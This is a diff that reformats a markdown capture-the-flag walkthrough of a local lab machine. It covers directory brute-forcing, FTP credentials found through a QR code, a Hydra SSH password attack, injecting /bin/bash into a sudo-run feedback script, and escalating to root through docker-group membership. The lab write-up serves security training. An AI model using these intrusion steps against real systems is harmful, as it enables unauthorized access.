@@ -37,11 +37,17 @@ The `dirb` tool was used to brute-force web directories with the command :
 dirb http://192.168.56.105 ~/Desktop/wordlist.txt -x.php,.html,.txt
 ```
 
-* This scan successfully located the `index.html` file.
-* The main webpage displayed the text "THE GAME BEGINS".
-* Navigating to `/hidden_text` revealed a maintenance page stating: "Maintanance! Sorry For Delay, We Will Recover Soon. Thank You...".
+This scan successfully located the `index.html` file.
+
+The main webpage displayed the text "THE GAME BEGINS".
+* Navigating to `/hidden_text` revealed a maintenance page stating: `"Maintanance! Sorry For Delay, We Will Recover Soon. Thank You..."`.
 * After clicking on the ``Thank You`` text, the website provides a ``QR code``.
-* Scanning the ``QR code`` revealed a bash script containing FTP login credentials: `USER=userftp` and `PASSWORD=ftpp@ssword`.
+* Scanning the ``QR code`` revealed a bash script containing FTP login credentials:
+
+```bash
+USER=userftp
+PASSWORD=ftpp@ssword
+```
 
 ## 4. FTP Enumeration
 A connection to the FTP server was initiated from the attacker terminal using the command :
@@ -50,34 +56,47 @@ A connection to the FTP server was initiated from the attacker terminal using th
 ftp 192.168.56.105
 ```
   
-* The login was successfully using username `userftp` and password `ftpp@ssword`.
-* The `ls` command was used to check the file system, revealing two files :
-  * `information.txt`
-  * `p_lists.txt`.
-* The transfer mode was switched to binary using the `bin` command.
-* The files were downloaded using
+The login was successfully using username `userftp` and password `ftpp@ssword`.
+
+The `ls` command was used to check the file system, revealing two files :
+* `information.txt`
+* `p_lists.txt`.
+
+The transfer mode was switched to binary using the command :
+
+```bash
+bin
+```
+
+The files were downloaded using
 
 ```bash
 get information.txt
 get p_lists.txt
 ```
 
-* The FTP session was closed using the `exit` command.
+Close FTP session using the command :
+
+```bash
+exit
+```
 
 ## 5. Analyzing Downloaded Files
-The command :
+Display the `information.txt` contents file using command :
 
 ```bash
 cat information.txt
 ```
 
-Used to read the first file.
-* The file contained a message to `robin` regarding their password weakness and noted that a password list was provided.
-The command :
+* The file contained a message to `robin` regarding their password weakness and noted that a `password list` was provided.
+
+Display the `p_lists.txt` contents file using command command :
+
 ```bash
 cat p_lists.txt
 ```
-Used to view the contents of the downloaded password list.
+
+* The file contained `password list`.
 
 ## 6. Initial Access (SSH Brute-Force)
 The Hydra tool was used against the SSH service with the command :
@@ -104,25 +123,14 @@ Use this command to let us execute as `Jerry` :
 sudo -u jerry /home/robin/project/feedback.sh
 ```
 
-* When running the feedback script, `test` was entered as the name, and `/bin/bash` was injected into the feedback prompt for the target machine.
+When running the feedback script, `test` was entered as the name, and `/bin/bash` was injected into the feedback prompt for the target machine.
 * The `whoami` command confirmed the current user changed to `jerry`.
-* The shell was upgraded using Python with the command :
+
+Upgrade shell using Python with the command :
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
-
-
-
-
-The root flag file was read using the command:
-
-Bash
-cat root.txt
-
-
-
-
 
 ## 8. Privilege Escalation: Jerry to Root
 The `id` command revealed that the user `jerry` was a member of the `docker` group (gid 114).
@@ -153,4 +161,8 @@ The root flag file was read using the command:
 cat root.txt
 ```
 
-The final Root-Flag discovered was: `Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}`.
+The final Root-Flag discovered was :
+
+```bash
+Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}
+```
